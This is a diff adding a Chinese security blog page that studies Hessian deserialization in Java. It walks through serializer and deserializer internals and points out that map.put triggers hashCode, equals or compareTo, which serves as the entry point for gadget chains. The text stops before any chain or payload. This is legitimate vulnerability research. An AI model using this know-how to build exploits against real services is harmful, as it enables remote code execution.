@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            Hessian反序列化整理 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Hessian反序列化整理
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-06 21:54:50</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri Mar 06 2026 21:55:53 GMT+0800">2026-03-06 21:55:53</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>36 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>本文首发于先知社区：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91672" >https://xz.aliyun.com/news/91672<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要的目标是：</p>
+<ol>
+<li>整理hessian1&#x2F;2的序列化反序列化流程</li>
+<li>hessian反序列化漏洞怎么临时修复</li>
+<li>收集hessian反序列化中的各种链子；绕过技巧</li>
+<li>补充其他hessian相关的知识点</li>
+</ol>
+<p>代码见：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/hessian" >https://github.com/1diot9/MyJavaSecStudy/tree/main/hessian<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.66<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h1><p>下面的序列化过程中，序列化工厂都设置为：允许序列化未实现Serializable接口的类</p>
+<h2 id="HessianOutput"><a href="#HessianOutput" class="headerlink" title="HessianOutput"></a>HessianOutput</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">baka</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1</span>, <span class="string">&quot;baka&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;baka&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = HessianTools.hessianSer2bytes(baka, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> HessianTools.hessianDeser(bytes, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hessianSer2bytes(Object obj, String version) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (version.equals(<span class="string">&quot;1&quot;</span>))&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos);</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> hessianOutput.getSerializerFactory();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);</span><br><span class="line"></span><br><span class="line">        hessianOutput.writeObject(obj);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (version.equals(<span class="string">&quot;2&quot;</span>))&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> hessian2Output.getSerializerFactory();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line"></span><br><span class="line">        hessian2Output.writeObject(obj);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>com.caucho.hessian.io.HessianOutput#writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772024757709-ac70d467-0b8a-46c5-9645-92984676e6b2.png"  alt="img"></p>
+<p>这里判断序列化对象是否为null，不是的话，根据对象所属类，调用_serializerFactory.getSerializer，去获取序列化器。</p>
+<p>com.caucho.hessian.io.SerializerFactory#getSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772024914982-3475cd9c-673d-4d2b-9768-99dada32b219.png"  alt="img"></p>
+<p>优先从缓存Map中搜索是否有当前Class对应的序列化器，有的话直接返回。没有的话，调用loadSerializer，根据类型获取对应的序列化器，然后put进缓存Map中，方便下次直接取。</p>
+<p>com.caucho.hessian.io.SerializerFactory#loadSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025188987-3d689226-ed07-4d49-b476-2d1907797a7d.png"  alt="img"></p>
+<p>295行处，_contextFactory.getSerializer(cl.getName())，根据类名称直接获取序列化器，这里能够直接获取的是39个基本类型：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025283363-6336e44f-e8c2-438e-81a2-8ca11022b3ce.png"  alt="img"></p>
+<p>com.caucho.hessian.io.SerializerFactory#loadSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025436756-91b6afce-cb6b-454f-ab37-e90711a7dc21.png"  alt="img"></p>
+<p>309行处，尝试获取自定义的序列化器，com.caucho.hessian.io.ContextSerializerFactory#getCustomSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025515049-812082bb-a242-4221-9a1b-67a1ec1e42eb.png"  alt="img"></p>
+<p>这里尝试获取XXXXHessianSerializer，说明Hessian也是可以自定义序列化逻辑的。</p>
+<p>com.caucho.hessian.io.SerializerFactory#loadSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025627267-d88ad320-4489-4dc3-9f32-0b2ef04c0ba2.png"  alt="img"></p>
+<p>很多if，判断是否为指定类型，以此判断是否调用其他内置序列化器。自定义类会走到最后getDefaultSerializer。</p>
+<p>com.caucho.hessian.io.SerializerFactory#getDefaultSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772025722374-4bee9135-ba1c-4d18-b694-e0e50e7d7a4f.png"  alt="img"></p>
+<p>先判断是否设置默认的序列化器，一般是没设置的。然后判断类是否实现Serializable接口，或是设置了_isAllowNonSerializable，这就是为什么一开始序列化时要手动设置工厂，这样能解除序列化限制，从而增加能够利用的类。最终，在默认情况下，会走到392行，create一个UnsafeSerializer。</p>
+<p>com.caucho.hessian.io.UnsafeSerializer#create</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772026044026-8b3a44fa-e3ea-4bc3-af4b-e8e8ff64599d.png"  alt="img"></p>
+<p>这里仍然有缓存机制，会根据不同的class，获取不同的UnsafeSerializer。跟进103行的构造方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772026114099-81487f99-4435-4954-879c-64092f4d0dd5.png"  alt="img"></p>
+<p>这里调用introspect，这个方法名比较特殊，有一个类叫java.beans.Introspector，专门用于“内省”，即获取JavaBean的公开属性和方法。跟进introspect：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772026545628-89b844ca-cf6c-4563-95e8-11d7ae9bfd1b.png"  alt="img"></p>
+<p>这里会获取所有的类属性。124行处，会判断属性修饰符，如果是transient或者static的，则不会参与序列化流程。这就是为什么说，transient或者static属性在gadget中不能使用，最经典的就是TemplatesImpl里面的_tfactory。</p>
+<p>com.caucho.hessian.io.UnsafeSerializer#introspect：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772026903209-b72875ee-97fc-47c1-b76a-d92b5083bff9.png"  alt="img"></p>
+<p>最后获取属性的序列化器。</p>
+<p>com.caucho.hessian.io.HessianOutput#writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772026987582-3b3e7a0c-7f62-407c-8b6f-69c3043bee80.png"  alt="img"></p>
+<p>序列化器获取完毕，现在开始序列化。</p>
+<p>com.caucho.hessian.io.UnsafeSerializer#writeObject</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772028790708-344623c1-c5dc-4786-8c28-2f79df65d501.png"  alt="img"></p>
+<p>writeObjectBegin写入开头的固定字节 Mt：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772028838105-37c44823-ab81-4a20-816d-b7bd279c8fe2.png"  alt="img"></p>
+<p>这里能够看出，HessianOutput默认将自定义对象当作Map来序列化。同时，com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin 始终返回-2，这代表使用hessian1进行序列化。</p>
+<p>回到writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772028945644-6ff19e63-b756-4410-92d8-8e22343c5707.png"  alt="img"></p>
+<p>ref是-2，所以进入writeObject10：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772028979603-701e4d8e-48ec-4f14-9cc0-399d102212f6.png"  alt="img"></p>
+<p>这里依次写入每个属性的名称和值，最后写入Map结束符。</p>
+<p>以上就是HessianOutput序列化自定义对象的过程。</p>
+<p>如果写入的是Map对象，过程也差不多，只是会调用MapSerializer，写入的type会变成null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772074307107-1da09d43-edf6-4425-8543-11128db0c5f3.png"  alt="img"></p>
+<p>实际写入的第一个字节为M：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772074424907-d2717025-b8b0-4dfa-b3e7-b792d599b83c.png"  alt="img"></p>
+<p>然后对每个键值对也使用writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772030845593-bfc1f18a-0be3-403c-9c68-37b10665ccc2.png"  alt="img"></p>
+<h2 id="HessianOutput2"><a href="#HessianOutput2" class="headerlink" title="HessianOutput2"></a>HessianOutput2</h2><p>com.caucho.hessian.io.Hessian2Output#writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031310487-aa74a1ba-838d-46a8-adde-25baf5aefcc4.png"  alt="img"></p>
+<p>获取序列化器的方法看上去不一样了，但实际调用的是一个方法</p>
+<p>com.caucho.hessian.io.SerializerFactory#getObjectSerializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031340122-9c1ee617-8230-4564-ab02-ac0f07ed72f8.png"  alt="img"></p>
+<p>这里还是会调用com.caucho.hessian.io.SerializerFactory#getSerializer</p>
+<p>com.caucho.hessian.io.UnsafeSerializer#writeObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031448221-990fc935-c504-4ef7-a351-b0fc0e4099ca.png"  alt="img"></p>
+<p>这里writeObjectBegin会不一样：</p>
+<p>com.caucho.hessian.io.Hessian2Output#writeObjectBegin</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031476156-0bcbb017-df21-4af7-9b96-7f7e9ab96092.png"  alt="img"></p>
+<ul>
+<li>如果这个类名（type）<strong>之前发过</strong>，就只发一个整数编号（引用 ID），省流量。</li>
+<li>如果这个类名<strong>第一次出现</strong>，就发一个标记 C 加上完整的类名字符串。</li>
+</ul>
+<p>这里自定义类默认情况下会在601行写入第一个字节C，最后返回-1，从而进入hessian2的序列化逻辑：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031588251-0e459b2d-0a87-49d7-a5c9-6aff459d0381.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031625450-a2ce3c74-19c4-4dcb-adec-01e2854fb141.png"  alt="img"></p>
+<p>对比一下，能够发现这里先写入了属性数量和属性名称，没有直接将属性值写入。而是在com.caucho.hessian.io.UnsafeSerializer#writeInstance里面再写入：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031796212-303d5c82-1274-4943-b4e0-ceec44bc2e8b.png"  alt="img"></p>
+<p>其他部分和HessianOutput差不多。</p>
+<p>如果写入的Map对象，还是调用MapSerializer，写入的type为null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772074263673-dcb844f1-1e6f-4c30-97b2-e1546396e059.png"  alt="img"></p>
+<p>实际写入的第一个字节为H：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772074521809-8caaccba-aae5-4e50-9e02-1a7e1d398f80.png"  alt="img"></p>
+<h1 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h1><h2 id="HessianInput"><a href="#HessianInput" class="headerlink" title="HessianInput"></a>HessianInput</h2><p>com.caucho.hessian.io.HessianInput#readObject()：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772031989788-a1d7f212-5bfe-4d80-9ea6-319c5e6861f3.png"  alt="img"></p>
+<p>通过switch的方式进入。因为自定义对象和Map对象默认写入的第一个字节都是M，所以进入M对应的case。</p>
+<p>com.caucho.hessian.io.SerializerFactory#readMap：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032078549-e1e57b19-f018-4e1c-a0fd-b0b60a42314c.png"  alt="img"></p>
+<p>获取反序列化器，然后根据获取情况进行反序列化。</p>
+<p>com.caucho.hessian.io.SerializerFactory#getDeserializer(java.lang.String)</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032201785-a219b314-2f02-420f-bd26-af71be06dc14.png"  alt="img"></p>
+<p>还是熟悉的味道，先判断null，然后从缓存取反序列化器，然后从_staticTypeMap，也就是几个基本类型里取，然后判断数组，最后使用默认的getDeserializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032365152-d3219589-0585-4f80-9152-8679896f5f98.png"  alt="img"></p>
+<p>这里和前面获取序列化器的过程几乎一模一样，只不过这里最终获取的是UnsafeDeserializer，看一下其构造方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032482573-3523dcc0-1792-4338-bd7d-a1debcb3beaf.png"  alt="img"></p>
+<p>com.caucho.hessian.io.UnsafeDeserializer#getFieldMap：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032597479-c30c88bc-693c-4218-b42b-5cb9c55d4243.png"  alt="img"></p>
+<p>这里也几乎一模一样，通过反射获取类的属性，把属性名和对应的反序列化器放到fieldMap里备用。</p>
+<p>回到com.caucho.hessian.io.SerializerFactory#readMap：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032760796-97ae23ed-9db2-49de-847d-0771919e735d.png"  alt="img"></p>
+<p>com.caucho.hessian.io.UnsafeDeserializer#readMap(com.caucho.hessian.io.AbstractHessianInput)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032789877-5f7f3eaa-9449-4200-978a-c4464cf48778.png"  alt="img"></p>
+<p>调用instantiate，通过Unsafe直接实例化对象，然后readMap还原各个属性。</p>
+<p>com.caucho.hessian.io.UnsafeDeserializer#readMap(com.caucho.hessian.io.AbstractHessianInput, java.lang.Object)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772032837475-f43db002-54d9-4628-acff-9abe49eb9046.png"  alt="img"></p>
+<p>这里也能看出是把自定义对象当作Map来还原的。先取出属性名，然后从filedMap取出对应反序列化器，然后deser.deserialize反序列化值，也是通过Unsafe方法根据偏移量直接还原。同时，这里也是可以重新resolve方法，来执行一些自定义操作。</p>
+<p>如果反序列化的是HashMap，稍有不同：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772033230802-43d5c0d8-d070-461c-8e82-0f87db4df60e.png"  alt="img"></p>
+<p>最终进入第三个if。因为序列化写type的时候，写入的是null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772033396030-d1d996f1-c430-4d21-930f-f0fee1a773c4.png"  alt="img"></p>
+<p>最终调用的反序列化器也是MapDeserializer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772349096957-5b8d3390-dfa7-4acd-bf3a-adfea46cb04c.png"  alt="img"></p>
+<p>这里最后的map.put，决定了我们利用链的入口。</p>
+<p>map.put，如果时HashMap可以触发key.hashCode，key.equals；如果是TreeMap，可以触发compareTo。其他Map也可能有可以利用的，得看map.put能不能继续利用。</p>
+<h2 id="HessianInput2"><a href="#HessianInput2" class="headerlink" title="HessianInput2"></a>HessianInput2</h2><p>也是通过switch来判断类型：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772345228656-cd8de70e-d13a-4b20-8ea8-800d8c0b66cd.png"  alt="img"></p>
+<p>com.caucho.hessian.io.Hessian2Input#readObjectDefinition：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772345388481-751489ce-9740-4d2f-aa03-f623e70d531c.png"  alt="img"></p>
+<p>先读取类名，然后读取属性数量，然后开始还原属性，但不设置值。这点和序列化的操作是对应的。</p>
+<p>获取反序列化器的过程，和前面序列化的几乎一模一样，这里直接放调用栈，细节可以自行调试：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772345430307-cfb94f33-88b5-4b00-9938-d5278cbcf4d6.png"  alt="img"></p>
+<p>最后会把还原好的属性通过ObjectDefinition进行包装，并put进_classDefs。至此，类定义部分的反序列化完成，下面开始还原值。</p>
+<p>往下跟到com.caucho.hessian.io.UnsafeDeserializer#readObject(com.caucho.hessian.io.AbstractHessianInput, java.lang.Object[])：</p>
